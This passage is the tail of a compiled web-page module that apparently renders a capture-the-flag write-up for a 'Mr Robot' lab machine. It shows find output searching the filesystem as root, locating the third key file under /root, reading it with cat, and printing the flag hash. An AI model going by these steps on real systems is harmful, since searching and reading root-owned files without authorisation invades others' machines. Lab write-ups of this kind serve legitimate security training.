find: <span class="token variable">&#96;</span></span>./proc/23622/task/23622/fdinfo/8<span class="token string">': No such file or directory
find: &#96;./proc/23622/fd/8'</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory
find: &#96;./proc/23622/fdinfo/8': No such <span class="token function">file</span> or directory
./root/key-3-of-3.txt
<span class="token function">cat</span> ./root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4</code>`}<!-- HTML_TAG_END --></pre>`;
});
export {
  Mr_robot as default,
  metadata
};
